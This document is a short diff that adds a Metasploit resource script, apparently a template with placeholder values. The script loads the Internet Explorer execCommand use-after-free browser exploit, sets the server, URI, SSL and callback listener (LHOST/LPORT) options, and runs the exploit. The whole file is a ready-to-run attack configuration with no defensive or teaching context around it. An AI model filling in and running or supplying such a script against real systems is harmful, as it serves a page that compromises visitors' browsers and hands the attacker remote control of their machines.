@@ -1,0 +1,8 @@
+use windows/browser/ie_execcommand_uaf
+set SRVHOST <CHANGE_SRVHOST>
+set SRVPORT <CHANGE_SRVPORT>
+set URIPATH <CHANGE_URIPATH>
+set SSL <CHANGE_SSL>
+set LHOST <CHANGE_LHOST>
+set LPORT <CHANGE_LPORT>
+exploit
